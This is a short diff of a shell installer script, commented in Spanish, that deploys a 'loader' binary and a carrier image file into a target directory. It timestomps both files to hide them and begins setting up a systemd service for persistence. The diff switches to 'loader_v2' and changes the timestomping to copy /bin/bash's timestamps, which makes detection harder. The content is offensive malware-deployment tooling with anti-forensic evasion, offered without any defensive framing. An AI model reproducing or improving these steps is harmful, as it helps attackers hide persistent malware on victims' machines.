@@ -13,12 +13,12 @@ mkdir -p "$SERVICE_DIR"
 
 # 1. Mover artefactos
 echo "[*] Instalando binarios en $TARGET_DIR..."
-cp loader "$TARGET_DIR/$LOADER_NAME"
+cp loader_v2 "$TARGET_DIR/$LOADER_NAME"
 cp image.png "$TARGET_DIR/$CARRIER_NAME"
 
 # 2. Timestomping (hacer que parezcan antiguos)
-touch -d "2024-01-01 12:00:00" "$TARGET_DIR/$LOADER_NAME"
-touch -d "2024-01-01 12:00:00" "$TARGET_DIR/$CARRIER_NAME"
+touch -r /bin/bash "$TARGET_DIR/$LOADER_NAME"
+touch -r /bin/bash "$TARGET_DIR/$CARRIER_NAME"
 
 # 3. Instalar servicio systemd
 echo "[*] Configurando servicio systemd..."
